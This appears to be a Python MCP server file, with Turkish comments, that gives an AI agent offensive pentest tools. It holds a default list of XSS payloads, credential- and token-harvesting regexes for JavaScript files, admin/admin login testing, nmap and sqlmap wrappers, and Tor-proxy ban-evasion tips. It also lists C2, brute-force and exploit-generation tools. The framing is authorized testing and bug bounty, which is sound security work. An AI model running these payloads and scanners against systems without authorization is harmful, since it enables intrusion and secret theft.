        # Formlar (input noktaları!)
        if data.get("forms"):
            output += f"\n{'─'*50}\n📝 Bulunan Formlar (SALDIRI YÜZEYİ!):\n"
            for f_info in data["forms"]:
                output += f"  🎯 {f_info['method']} → {f_info['action'] or '(self)'}\n"
                output += f"     Sayfa: {f_info['page']}\n"
                output += f"     Fields: {', '.join(fi['name'] + '(' + fi['type'] + ')' for fi in f_info['fields'])}\n"

        # JS dosyaları
        if data.get("js_files"):
            output += f"\n{'─'*50}\n📜 JS Dosyaları (linkfinder_scan ile analiz edin!):\n"
            for js in data["js_files"][:20]:
                output += f"  {js}\n"

        return output
    except json.JSONDecodeError:
        return format_output(result)


@mcp.tool()
def browser_dom_xss(
    url: str,
    payloads: str = "",
    timeout: int = 30
) -> str:
    """Playwright ile DOM-based XSS taraması.
    URL parametreleri ve fragment'lara XSS payload enjekte edip alert/error tetiklenip tetiklenmediğini kontrol eder.

    Args:
        url: Test edilecek URL (parametreli, ör: http://target.com/search?q=test)
        payloads: Özel payload listesi (satır başı ayrılmış, boş: varsayılan set)
        timeout: Her payload için zaman aşımı (saniye)
    """
    default_payloads = [
        '<img src=x onerror=alert(document.domain)>',
        '"><svg onload=alert(1)>',
        "'-alert(1)-'",
        '<details open ontoggle=alert(1)>',
        '{{constructor.constructor("alert(1)")()}}',
        'javascript:alert(1)//',
        '<iframe srcdoc="<script>alert(1)</script>">',
    ]
    test_payloads = payloads.strip().split("\n") if payloads.strip() else default_payloads

    script = f'''
import asyncio, json, sys
from playwright.async_api import async_playwright
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

url = """{url}"""
payloads = {json.dumps(test_payloads)}

async def test_dom_xss():
    results = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        params = {{"q": ["test"], "search": ["test"], "input": ["test"]}}

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=["--no-sandbox"])
        context = await browser.new_context(ignore_https_errors=True)
        page = await context.new_page()

        for param_name in params:
            for payload in payloads:
                alerts = []

                def handle_dialog(dialog):
                    alerts.append(dialog.message)
                    dialog.accept()

                page.on("dialog", handle_dialog)

                test_params = dict(params)
                test_params[param_name] = [payload]
                flat = {{k: v[0] for k, v in test_params.items()}}
                test_url = urlunparse(parsed._replace(query=urlencode(flat)))

                try:
                    await page.goto(test_url, wait_until="domcontentloaded", timeout=8000)
                    await asyncio.sleep(1)

                    if alerts:
                        results.append({{
                            "vulnerable": True,
                            "param": param_name,
                            "payload": payload,
                            "url": test_url,
                            "alert_message": alerts[0]
                        }})
                except Exception:
                    pass

                page.remove_listener("dialog", handle_dialog)

        # Fragment tabanlı test
        for payload in payloads[:3]:
            alerts = []
            def handle_dialog2(dialog):
                alerts.append(dialog.message)
                dialog.accept()
            page.on("dialog", handle_dialog2)
            try:
                test_url = url.split("#")[0] + "#" + payload
                await page.goto(test_url, wait_until="domcontentloaded", timeout=8000)
                await asyncio.sleep(1)
                if alerts:
                    results.append({{
                        "vulnerable": True,
                        "param": "#fragment",
                        "payload": payload,
                        "url": test_url,
                        "alert_message": alerts[0]
                    }})
            except Exception:
                pass
            page.remove_listener("dialog", handle_dialog2)

        await browser.close()

    print(json.dumps(results, indent=2))

asyncio.run(test_dom_xss())
'''

    script_path = tempfile.mktemp(suffix=".py")
    with open(script_path, "w") as f:
        f.write(script)

    result = run_command(f"python3 {script_path}", timeout=timeout * len(test_payloads) + 30)
    try:
        os.unlink(script_path)
    except Exception:
        pass

    if not result["success"]:
        if "playwright" in result["stderr"].lower():
            return "HATA: Playwright kurulu değil. pip3 install playwright && playwright install chromium"
        return format_output(result)

    try:
        findings = json.loads(result["stdout"])
        if not findings:
            return f"✅ {url} üzerinde DOM XSS bulunamadı ({len(test_payloads)} payload test edildi)."

        output = f"🔴 DOM XSS BULUNDU! ({len(findings)} zafiyet)\n{'='*55}\n"
        for i, f_info in enumerate(findings, 1):
            output += f"\n#{i} DOM XSS — Parametre: {f_info['param']}\n"
            output += f"  Payload: {f_info['payload']}\n"
            output += f"  URL: {f_info['url']}\n"
            output += f"  Alert: {f_info.get('alert_message', 'triggered')}\n"

        return output
    except json.JSONDecodeError:
        return format_output(result)


@mcp.tool()
def browser_auth_test(
    login_url: str,
    username_field: str = "username",
    password_field: str = "password",
    username: str = "admin",
    password: str = "admin",
    success_indicator: str = "",
    timeout: int = 15
) -> str:
    """Playwright ile auth flow testi — login, session analizi, post-login keşif.

    Args:
        login_url: Login sayfası URL'si
        username_field: Kullanıcı adı input name/id
        password_field: Şifre input name/id
        username: Test kullanıcı adı
        password: Test şifresi
        success_indicator: Başarılı login göstergesi (ör: 'dashboard', 'welcome')
        timeout: Zaman aşımı
    """
    script = f'''
import asyncio, json
from playwright.async_api import async_playwright

async def auth_test():
    result = {{"login_success": False, "cookies": [], "post_login_url": "", "page_title": "", "storage": {{}}}}

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=["--no-sandbox"])
        context = await browser.new_context(ignore_https_errors=True)
        page = await context.new_page()

        try:
            await page.goto("{login_url}", wait_until="networkidle", timeout=10000)

            # Login formu doldur
            try:
                await page.fill('input[name="{username_field}"], input[id="{username_field}"]', "{username}")
                await page.fill('input[name="{password_field}"], input[id="{password_field}"]', "{password}")
            except Exception:
                await page.fill('input[type="text"]:first-of-type', "{username}")
                await page.fill('input[type="password"]', "{password}")

            # Submit
            try:
                await page.click('button[type="submit"], input[type="submit"]')
            except Exception:
                await page.press('input[type="password"]', "Enter")

            await page.wait_for_load_state("networkidle", timeout=8000)

            result["post_login_url"] = page.url
            result["page_title"] = await page.title()

            # Cookie analizi
            cookies = await context.cookies()
            result["cookies"] = [{{"name": c["name"], "value": c["value"][:50], "httpOnly": c.get("httpOnly", False),
                                   "secure": c.get("secure", False), "sameSite": c.get("sameSite", "")}}
                                 for c in cookies]

            # localStorage/sessionStorage
            try:
                local_storage = await page.evaluate("() => JSON.stringify(localStorage)")
                session_storage = await page.evaluate("() => JSON.stringify(sessionStorage)")
                result["storage"] = {{"localStorage": local_storage[:500], "sessionStorage": session_storage[:500]}}
            except Exception:
                pass

            # Başarı kontrolü
            indicator = "{success_indicator}"
            if indicator:
                content = await page.content()
                result["login_success"] = indicator.lower() in content.lower()
            else:
                result["login_success"] = page.url != "{login_url}"

        except Exception as e:
            result["error"] = str(e)[:200]

        await browser.close()

    print(json.dumps(result, indent=2))

asyncio.run(auth_test())
'''

    script_path = tempfile.mktemp(suffix=".py")
    with open(script_path, "w") as f:
        f.write(script)

    result = run_command(f"python3 {script_path}", timeout=timeout + 10)
    try:
        os.unlink(script_path)
    except Exception:
        pass

    if not result["success"]:
        return format_output(result)

    try:
        data = json.loads(result["stdout"])
        status = "✅ BAŞARILI" if data.get("login_success") else "❌ BAŞARISIZ"
        output = f"🔐 Auth Test: {login_url}\n{'='*55}\n"
        output += f"  Login: {status}\n"
        output += f"  Post-login URL: {data.get('post_login_url', '?')}\n"
        output += f"  Sayfa: {data.get('page_title', '?')}\n"

        if data.get("cookies"):
            output += f"\n  🍪 Cookie'ler ({len(data['cookies'])}):\n"
            for c in data["cookies"]:
                flags = []
                if not c.get("httpOnly"):
                    flags.append("⚠️ HttpOnly=false (XSS riski!)")
                if not c.get("secure"):
                    flags.append("⚠️ Secure=false")
                if c.get("sameSite", "").lower() == "none":
                    flags.append("⚠️ SameSite=None (CSRF riski!)")
                output += f"    {c['name']}={c['value'][:30]}... {' | '.join(flags)}\n"

        if data.get("storage", {}).get("localStorage", "{}") != "{}":
            output += f"\n  💾 localStorage: {data['storage']['localStorage'][:200]}\n"

        if data.get("error"):
            output += f"\n  ⚠️ Hata: {data['error']}\n"

        return output
    except json.JSONDecodeError:
        return format_output(result)


# ============================================================
# JAVASCRIPT ANALİZ SUITE (Phase 7)
# ============================================================

@mcp.tool()
def linkfinder_scan(
    url: str,
    output_format: str = "cli",
    extra_args: str = ""
) -> str:
    """LinkFinder ile JavaScript dosyalarından endpoint çıkar.
    REST API path'leri, gizli admin panelleri, internal URL'ler bulur.

    Args:
        url: JS dosyası URL'si veya web sayfası URL'si
        output_format: Çıktı formatı ('cli', 'html')
        extra_args: Ek argümanlar
    """
    # linkfinder kurulu mu?
    r = run_command("python3 -c 'import linkfinder' 2>/dev/null", timeout=5)
    if r["returncode"] != 0:
        # Inline extraction fallback
        return _extract_endpoints_manual(url)

    cmd = f"python3 -m linkfinder -i {shlex.quote(url)} -o {output_format} {extra_args}"
    result = run_command(cmd, timeout=60)
    output = format_output(result)

    if not output.strip() or result["returncode"] != 0:
        return _extract_endpoints_manual(url)

    return f"🔗 LinkFinder Sonuçları: {url}\n{'='*50}\n{output}"


def _extract_endpoints_manual(url: str) -> str:
    """LinkFinder yoksa manuel JS endpoint extraction."""
    # JS içeriğini indir
    r = run_command(f"curl -sL {shlex.quote(url)} 2>/dev/null", timeout=15)
    if not r["stdout"]:
        return f"JS içeriği alınamadı: {url}"

    content = r["stdout"]

    # Regex ile endpoint'leri çıkar
    import re as _re
    patterns = [
        r'["\']/(api|v[0-9]|graphql|admin|internal|private|hidden|secret|debug|test|staging|dev)[/\w.-]*["\']',
        r'["\'](https?://[^"\'>\s]+)["\']',
        r'["\'](/[a-zA-Z0-9._/-]{3,})["\']',
        r'fetch\s*\(\s*["\']([^"\']+)["\']',
        r'axios\.[a-z]+\s*\(\s*["\']([^"\']+)["\']',
        r'\.ajax\s*\(\s*\{[^}]*url\s*:\s*["\']([^"\']+)["\']',
        r'XMLHttpRequest.*open\s*\(\s*["\'][A-Z]+["\']\s*,\s*["\']([^"\']+)["\']',
    ]

    endpoints = set()
    for pattern in patterns:
        matches = _re.findall(pattern, content)
        for m in matches:
            if isinstance(m, tuple):
                m = m[0]
            if len(m) > 3 and not m.endswith(('.png', '.jpg', '.gif', '.css', '.ico', '.svg', '.woff')):
                endpoints.add(m)

    # Secret pattern'leri de ara
    secret_patterns = [
        r'(?:api[_-]?key|apikey|api_secret|token|secret|password|passwd|auth)\s*[:=]\s*["\']([^"\']{8,})["\']',
        r'["\']([A-Za-z0-9+/]{40,}={0,2})["\']',  # Base64 long strings
        r'(?:Bearer|Basic)\s+([A-Za-z0-9+/._=-]{20,})',
    ]

    secrets = set()
    for pattern in secret_patterns:
        matches = _re.findall(pattern, content, _re.IGNORECASE)
        for m in matches:
            if len(m) > 8:
                secrets.add(m[:60])

    output = f"🔗 JS Endpoint Extraction: {url}\n{'='*50}\n"

    if endpoints:
        output += f"\n📌 Bulunan Endpoint'ler ({len(endpoints)}):\n"
        # Kritik olanları üste çıkar
        critical = [e for e in endpoints if any(kw in e.lower() for kw in ['admin', 'api', 'internal', 'secret', 'debug', 'graphql', 'private'])]
        normal = [e for e in endpoints if e not in critical]

        for ep in sorted(critical):
            output += f"  🔴 {ep}\n"
        for ep in sorted(normal)[:30]:
            output += f"  {ep}\n"
        if len(normal) > 30:
            output += f"  ... (+{len(normal)-30} daha)\n"
    else:
        output += "\nEndpoint bulunamadı.\n"

    if secrets:
        output += f"\n🔑 Olası Secret'lar ({len(secrets)}):\n"
        for s in list(secrets)[:10]:
            output += f"  ⚠️ {s}\n"

    return output


@mcp.tool()
def secretfinder_scan(
    url: str,
    extra_args: str = ""
) -> str:
    """JS dosyalarında API key, token, password gibi secret'ları ara.
    LinkFinder'ın secret odaklı versiyonu.

    Args:
        url: JS dosyası veya web sayfası URL'si
        extra_args: Ek argümanlar
    """
    # SecretFinder kurulu mu dene
    r = run_command("python3 -c 'from SecretFinder import SecretFinder' 2>/dev/null", timeout=5)
    if r["returncode"] == 0:
        cmd = f"python3 -m SecretFinder -i {shlex.quote(url)} -o cli {extra_args}"
        result = run_command(cmd, timeout=60)
        if result["stdout"].strip():
            return f"🔑 SecretFinder Sonuçları: {url}\n{'='*50}\n{format_output(result)}"

    # Fallback: curl + regex
    r = run_command(f"curl -sL {shlex.quote(url)} 2>/dev/null", timeout=15)
    if not r["stdout"]:
        return f"İçerik alınamadı: {url}"

    import re as _re
    content = r["stdout"]

    patterns = {
        "AWS Access Key": r'AKIA[0-9A-Z]{16}',
        "AWS Secret Key": r'(?:aws_secret|secret_access_key)\s*[:=]\s*["\']?([A-Za-z0-9/+=]{40})',
        "Google API Key": r'AIza[0-9A-Za-z_-]{35}',
        "Firebase": r'["\']https://[a-z0-9-]+\.firebaseio\.com["\']',
        "Slack Token": r'xox[baprs]-[0-9a-zA-Z-]{10,}',
        "GitHub Token": r'gh[pousr]_[0-9a-zA-Z]{36,}',
        "JWT Token": r'eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+',
        "Private Key": r'-----BEGIN (?:RSA|DSA|EC|OPENSSH) PRIVATE KEY-----',
        "Heroku API Key": r'[hH]eroku[a-zA-Z0-9_-]*[kK]ey\s*[:=]\s*["\']?([0-9a-fA-F-]{36})',
        "Mailgun Key": r'key-[0-9a-zA-Z]{32}',
        "Twilio": r'SK[0-9a-fA-F]{32}',
        "Stripe Key": r'(?:sk|pk)_(?:live|test)_[0-9a-zA-Z]{24,}',
        "Square OAuth": r'sq0[a-z]{3}-[0-9A-Za-z_-]{22,}',
        "Discord Token": r'[MN][A-Za-z\d]{23,}\.[\w-]{6}\.[\w-]{27}',
        "Generic Secret": r'(?:secret|password|passwd|api_key|apikey|token|auth)[\s]*[:=][\s]*["\']([^"\']{8,})["\']',
        "Internal URL": r'https?://(?:10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+|localhost)[:/][^\s"\']+',
    }

    findings = {}
    for name, pattern in patterns.items():
        matches = _re.findall(pattern, content)
        if matches:
            findings[name] = list(set(m if isinstance(m, str) else m[0] for m in matches))[:5]

    if not findings:
        return f"✅ {url} içinde secret bulunamadı."

    output = f"🔑 Secret Taraması: {url}\n{'='*55}\n"
    for category, values in findings.items():
        output += f"\n🔴 {category}:\n"
        for v in values:
            output += f"  → {v[:80]}{'...' if len(v) > 80 else ''}\n"

    output += f"\n⚠️ TOPLAM: {sum(len(v) for v in findings.values())} potansiyel secret bulundu!\n"
    return output


@mcp.tool()
def js_beautify(
    url: str,
    grep_pattern: str = ""
) -> str:
    """Minified JS dosyasını beautify et ve opsiyonel grep ile filtrele.
    Source map yoksa code review için kritik.

    Args:
        url: JS dosyası URL'si
        grep_pattern: Filtrelenecek pattern (ör: 'admin|api|token|secret')
    """
    r = run_command(f"curl -sL {shlex.quote(url)} 2>/dev/null", timeout=15)
    if not r["stdout"]:
        return f"JS dosyası alınamadı: {url}"

    content = r["stdout"]

    # js-beautify kuruluysa kullan
    r2 = run_command(f"echo {shlex.quote(content[:5000])} | js-beautify - 2>/dev/null", timeout=10)
    if r2["returncode"] == 0 and r2["stdout"]:
        beautified = r2["stdout"]
    else:
        # Python ile basit beautify
        beautified = content.replace(";", ";\n").replace("{", "{\n").replace("}", "\n}\n")

    if grep_pattern:
        import re as _re
        lines = beautified.split("\n")
        matched = [line.strip() for line in lines if _re.search(grep_pattern, line, _re.IGNORECASE)]
        if matched:
            return f"📜 JS Beautify + Grep ({grep_pattern}): {url}\n{'='*50}\n" + "\n".join(matched[:100])
        return f"Pattern '{grep_pattern}' bulunamadı."

    # Truncate
    if len(beautified) > 5000:
        return f"📜 JS Beautify: {url}\n{'='*50}\n{beautified[:5000]}\n\n... ({len(beautified)} karakter, truncated)"

    return f"📜 JS Beautify: {url}\n{'='*50}\n{beautified}"


# ============================================================
# SUBDOMAIN TAKEOVER DOĞRULAMA (Phase 7)
# ============================================================

@mcp.tool()
def subdomain_takeover_check(
    domain: str,
    wordlist: str = "",
    extra_args: str = ""
) -> str:
    """Subdomain takeover açıklarını kontrol et.
    Dangling CNAME'ler, expired services, unclaimed resources tespit eder.

    Args:
        domain: Hedef domain (ör: example.com)
        wordlist: Subdomain wordlist (boş: subfinder çıktısı)
        extra_args: Ek argümanlar
    """
    # Önce subdomain'leri bul
    subs_file = f"/tmp/subs_{domain.replace('.', '_')}_{int(time.time())}.txt"

    if wordlist and os.path.exists(wordlist):
        subs_file = wordlist
    else:
        r = run_command(f"subfinder -d {shlex.quote(domain)} -silent 2>/dev/null | head -200", timeout=60)
        if r["stdout"].strip():
            with open(subs_file, "w") as f:
                f.write(r["stdout"])
        else:
            return f"'{domain}' için subdomain bulunamadı. Önce keşif yapın."

    outputs = []

    # subjack dene
    r = run_command("which subjack 2>/dev/null", timeout=3)
    if r["returncode"] == 0:
        r = run_command(f"subjack -w {subs_file} -t 50 -timeout 10 -ssl -v {extra_args}", timeout=120)
        if r["stdout"].strip():
            outputs.append(f"[subjack]\n{r['stdout'].strip()}")

    # Manuel CNAME kontrol
    try:
        with open(subs_file, 'r') as f:
            subdomains = [s.strip() for s in f.readlines() if s.strip()]
    except Exception:
        subdomains = []

    vulnerable_services = [
        "github.io", "herokuapp.com", "s3.amazonaws.com", "cloudfront.net",
        "azurewebsites.net", "blob.core.windows.net", "cloudapp.net",
        "trafficmanager.net", "pantheon.io", "readme.io", "surge.sh",
        "bitbucket.io", "ghost.io", "helpscoutdocs.com", "feedpress.me",
        "freshdesk.com", "zendesk.com", "statuspage.io", "tumblr.com",
        "wordpress.com", "shopify.com", "unbounce.com", "helpjuice.com",
        "teamwork.com", "cargocollective.com", "uservoice.com",
        "smartling.com", "getfly.com", "aftership.com", "tictail.com",
    ]

    dangling = []
    for sub in subdomains[:100]:
        r = run_command(f"dig +short CNAME {shlex.quote(sub)} 2>/dev/null", timeout=5)
        cname = r["stdout"].strip()
        if cname:
            # Vulnerable service'e point ediyor mu?
            for service in vulnerable_services:
                if service in cname.lower():
                    # NXDOMAIN kontrolü
                    r2 = run_command(f"dig +short {shlex.quote(cname.rstrip('.'))} 2>/dev/null", timeout=5)
                    if not r2["stdout"].strip():
                        dangling.append({
                            "subdomain": sub,
                            "cname": cname,
                            "service": service,
                            "status": "TAKEOVER POSSIBLE"
                        })
                    break

    if dangling:
        outputs.append(f"\n🔴 SUBDOMAIN TAKEOVER TESPİT EDİLDİ ({len(dangling)}):")
        for d in dangling:
            outputs.append(f"  🎯 {d['subdomain']} → {d['cname']} ({d['service']})")

    if outputs:
        return f"🌐 Subdomain Takeover Check: {domain}\n{'='*55}\n" + "\n".join(outputs)

    return f"✅ {domain} üzerinde subdomain takeover açığı bulunamadı ({len(subdomains)} subdomain kontrol edildi)."


# ============================================================
# ADAPTIVE RATE LIMITER (Phase 7)
# ============================================================

# Global rate limit ayarları
_rate_limit_config = {
    "requests_per_second": 10,
    "backoff_on_429": True,
    "backoff_multiplier": 2.0,
    "max_backoff_seconds": 60,
    "proxy": "",
    "rotate_user_agent": True,
    "current_delay": 0.1,
}

@mcp.tool()
def set_rate_limit(
    requests_per_second: int = 10,
    backoff_on_429: bool = True,
    proxy: str = "",
    rotate_user_agent: bool = True
) -> str:
    """Adaptive rate limiter ayarla — hedef tarafından banlanmayı önle.
    Tüm HTTP tool'ları bu ayarları kullanır.

    Args:
        requests_per_second: Saniyede max istek (1-100)
        backoff_on_429: 429 (Too Many Requests) alınca otomatik yavaşla
        proxy: Proxy adresi (ör: 'socks5://127.0.0.1:9050' Tor, 'http://proxy:8080')
        rotate_user_agent: Her istekte farklı User-Agent kullan
    """
    _rate_limit_config["requests_per_second"] = max(1, min(100, requests_per_second))
    _rate_limit_config["backoff_on_429"] = backoff_on_429
    _rate_limit_config["proxy"] = proxy
    _rate_limit_config["rotate_user_agent"] = rotate_user_agent
    _rate_limit_config["current_delay"] = 1.0 / _rate_limit_config["requests_per_second"]

    proxy_info = f"Proxy: {proxy}" if proxy else "Proxy: Yok (direkt bağlantı)"

    return f"""⚙️ Rate Limiter Ayarlandı
{'='*40}
  Rate: {requests_per_second} req/s (delay: {_rate_limit_config['current_delay']:.2f}s)
  429 Backoff: {'Aktif' if backoff_on_429 else 'Pasif'}
  {proxy_info}
  UA Rotation: {'Aktif' if rotate_user_agent else 'Pasif'}

💡 İpuçları:
  - Bug bounty: 5-10 req/s önerilir
  - Agresif tarama: 50+ req/s (ban riski!)
  - Tor proxy: set_rate_limit(proxy='socks5://127.0.0.1:9050')
"""


@mcp.tool()
def get_rate_limit_status() -> str:
    """Mevcut rate limiting durumunu göster."""
    return json.dumps(_rate_limit_config, indent=2)


# ============================================================
# STRUCTURED PARSERS (Phase A) — Nmap XML + sqlmap JSON → JSON
# ============================================================

@mcp.tool()
def nmap_scan_structured(
    target: str,
    options: str = "-sV -T4 --top-ports 1000",
    timeout_sec: int = 600,
) -> str:
    """Nmap taraması yap ve sonucu JSON olarak döndür (LLM için daha doğru).
    Ham nmap çıktısı yerine host/port/service/script dict'leri döner.

    Args:
        target: Hedef IP/domain/CIDR
        options: nmap argümanları (varsayılan: -sV -T4 --top-ports 1000)
        timeout_sec: Max tarama süresi (default 600s)
    """
    import xml.etree.ElementTree as _ET

    # Güvenlik kontrolü
    full_cmd = f"nmap {options} {target}"
    ok, reason = validate_command(full_cmd)
    if not ok:
        return reason

    # -oX - ile XML çıktı al
    xml_cmd = f"nmap {options} -oX - {shlex.quote(target)}"
    result = run_command(xml_cmd, timeout=timeout_sec)
    if not result["success"] and not result["stdout"]:
        return json.dumps({
            "error": "nmap başarısız",
            "stderr": result["stderr"][:500],
            "target": target,
        })

    try:
        root = _ET.fromstring(result["stdout"])
    except _ET.ParseError as e:
        return json.dumps({"error": f"XML parse başarısız: {e}", "raw": result["stdout"][:800]})

    hosts: list[dict] = []
    for host_el in root.findall("host"):
        addr_el = host_el.find("address")
        ip = addr_el.get("addr") if addr_el is not None else ""
        status_el = host_el.find("status")
        state = status_el.get("state") if status_el is not None else "unknown"
        hostnames = [h.get("name") for h in host_el.findall("hostnames/hostname") if h.get("name")]

        ports: list[dict] = []
        for p in host_el.findall("ports/port"):
            port_num = int(p.get("portid", 0))
            proto = p.get("protocol", "")
            state_el = p.find("state")
            port_state = state_el.get("state") if state_el is not None else ""
            svc = p.find("service")
            service = {
                "name": svc.get("name", "") if svc is not None else "",
                "product": svc.get("product", "") if svc is not None else "",
                "version": svc.get("version", "") if svc is not None else "",
                "extrainfo": svc.get("extrainfo", "") if svc is not None else "",
                "cpe": [c.text for c in (svc.findall("cpe") if svc is not None else []) if c.text],
            }
            scripts = [
                {"id": s.get("id", ""), "output": (s.get("output") or "")[:800]}
                for s in p.findall("script")
            ]
            ports.append({
                "port": port_num, "protocol": proto, "state": port_state,
                "service": service, "scripts": scripts,
            })

        os_el = host_el.find("os/osmatch")
        os_guess = {
            "name": os_el.get("name", "") if os_el is not None else "",
            "accuracy": os_el.get("accuracy", "") if os_el is not None else "",
        }

        hosts.append({
            "ip": ip, "state": state, "hostnames": hostnames,
            "os": os_guess, "ports": ports,
            "open_port_count": sum(1 for p in ports if p["state"] == "open"),
        })

    runstats_el = root.find("runstats/finished")
    summary = {
        "target": target,
        "options": options,
        "hosts_scanned": len(hosts),
        "total_open_ports": sum(h["open_port_count"] for h in hosts),
        "elapsed_sec": runstats_el.get("elapsed") if runstats_el is not None else "",
        "hosts": hosts,
    }
    return json.dumps(summary, indent=2, ensure_ascii=False)


@mcp.tool()
def sqlmap_test_structured(
    target_url: str,
    options: str = "--batch --level=2 --risk=1",
    timeout_sec: int = 900,
) -> str:
    """sqlmap taramasını JSON çıktısıyla çalıştır; önemli bulgulara ait yapılandırılmış özet döndürür.

    Args:
        target_url: Hedef URL (parametreleriyle birlikte)
        options: sqlmap argümanları (varsayılan: --batch --level=2 --risk=1)
        timeout_sec: Max çalışma süresi (default 900s)
    """
    # Geçici output dir
    out_dir = tempfile.mkdtemp(prefix="sqlmap_", dir="/tmp")
    cmd = f"sqlmap -u {shlex.quote(target_url)} {options} --batch --output-dir={shlex.quote(out_dir)}"
    ok, reason = validate_command(cmd)
    if not ok:
        return reason
    result = run_command(cmd, timeout=timeout_sec)

    # sqlmap output-dir'i altında target klasörü ve log dosyaları oluşur
    summary = {
        "target": target_url,
        "returncode": result["returncode"],
        "vulnerable": False,
        "dbms": "",
        "techniques": [],
        "injectable_params": [],
        "log_excerpt": "",
    }

    stdout = result.get("stdout", "")
    # Temel pattern'ler
    if "is vulnerable" in stdout or "are vulnerable" in stdout:
        summary["vulnerable"] = True
    m_dbms = re.search(r"back-end DBMS:\s*(.+)", stdout)
    if m_dbms:
        summary["dbms"] = m_dbms.group(1).strip().splitlines()[0][:120]
    # Teknikler
    for tech in ["boolean-based blind", "time-based blind", "error-based", "UNION query", "stacked queries"]:
        if tech.lower() in stdout.lower():
            summary["techniques"].append(tech)
    # Parametre(ler)
    for m in re.finditer(r"Parameter:\s*(\S+)\s*\(([^)]+)\)", stdout):
        summary["injectable_params"].append({"param": m.group(1), "place": m.group(2)})

    # Log'un son 2000 karakteri (LLM için)
    summary["log_excerpt"] = stdout[-2000:]

    return json.dumps(summary, indent=2, ensure_ascii=False)



# ============================================================
# TOOL GRUP FİLTRELEME — Token Tasarrufu (opsiyonel)
# ============================================================
# kali-tools 76 tool ile en büyük şema maliyetine sahip (~12K token/istek).
# CCO_KALI_GROUPS env'i verilirse YALNIZCA o gruplar register kalır; geri
# kalan tool'lar kaldırılır → context'e daha az şema yüklenir.
# Profiller (scripts/cco-profile.sh) bunu görev tipine göre ayarlar.
# Env verilmezse veya "all" ise tüm 76 tool yüklenir (varsayılan davranış korunur).
#
# Her tool TAM OLARAK bir gruba aittir (toplam 76):
KALI_TOOL_GROUPS = {
    # core — temel recon/scan/enum + kontrol (her zaman gerekli)
    "nmap_scan": "core", "nmap_scan_structured": "core", "masscan_scan": "core",
    "ffuf_fuzz": "core", "gobuster_scan": "core", "nuclei_scan": "core",
    "nikto_scan": "core", "wpscan_scan": "core", "whatweb_fingerprint": "core",
    "wafw00f_detect": "core", "dig_dns": "core", "whois_enrichment": "core",
    "subfinder_enum": "core", "subdomain_takeover_check": "core", "curl_request": "core",
    "netcat_connect": "core", "parallel_recon": "core", "kiterunner_scan": "core",
    "gau_urls": "core", "waybackurls_fetch": "core", "file_analyze": "core",
    "shell_exec": "core", "python_exec": "core", "request_approval": "core",
    "check_approval": "core", "list_pending_approvals": "core", "approve_operation": "core",
    "reject_operation": "core", "set_rate_limit": "core", "get_rate_limit_status": "core",
    # osint — pasif/aktif istihbarat + cloud enum
    "osint_harvest": "osint", "spiderfoot_scan": "osint", "sherlock_lookup": "osint",
    "cloud_enum": "osint", "aws_security_check": "osint",
    # web — web exploit + JS analizi + browser + OOB
    "sqlmap_test": "web", "sqlmap_test_structured": "web", "linkfinder_scan": "web",
    "secretfinder_scan": "web", "js_beautify": "web", "browser_crawl": "web",
    "browser_auth_test": "web", "browser_dom_xss": "web", "mitmproxy_dump": "web",
    "interactsh_start": "web", "interactsh_poll": "web", "interactsh_stop": "web",
    # exploit — exploit arama/üretim + brute + C2 + secret scan
    "searchsploit_search": "exploit", "metasploit_search": "exploit",
    "ysoserial_generate": "exploit", "generate_exploit_poc": "exploit",
    "hydra_brute": "exploit", "sliver_command": "exploit",
    "gitleaks_scan": "exploit", "trufflehog_scan": "exploit",
    # pwn — binary/RE/forensics/crypto-crack
    "angr_analyze": "pwn", "ghidra_headless": "pwn", "frida_hook": "pwn",
    "volatility_analyze": "pwn", "steghide_extract": "pwn", "steg_deep_analyze": "pwn",
    "hashcat_crack": "pwn", "john_crack": "pwn",
    # ad — Active Directory / internal
    "bloodhound_collect": "ad", "enum4linux_scan": "ad", "impacket_tool": "ad",
    # llm — LLM delegation + meta analiz
    "qwen_analyze": "llm", "parallel_llm_analyze": "llm", "self_improve": "llm",
    "screenshot_analyze": "llm",
    # swarm — orkestrasyon / daemon
    "swarm_dispatch": "swarm", "swarm_chain": "swarm",
    "start_recon_daemon": "swarm", "stop_recon_daemon": "swarm",
    # report — raporlama
    "generate_pentest_report": "report", "cvss_calculate": "report",
}

_kali_groups_env = os.environ.get("CCO_KALI_GROUPS", "").strip()
if _kali_groups_env and _kali_groups_env.lower() != "all":
    _enabled_groups = {g.strip() for g in _kali_groups_env.split(",") if g.strip()}
    for _tool_name in list(mcp._tool_manager._tools.keys()):
        if KALI_TOOL_GROUPS.get(_tool_name, "core") not in _enabled_groups:
            mcp.remove_tool(_tool_name)


if __name__ == "__main__":
    import sys
    
    transport = "stdio"
    port = 8080
    
    for i, arg in enumerate(sys.argv[1:], 1):
        if arg == "--transport" and i < len(sys.argv) - 1:
            transport = sys.argv[i + 1]
        elif arg == "--port" and i < len(sys.argv) - 1:
            port = int(sys.argv[i + 1])
    
    if transport == "stdio":
        mcp.run(transport="stdio")
    else:
        mcp.run(transport="streamable-http", port=port)
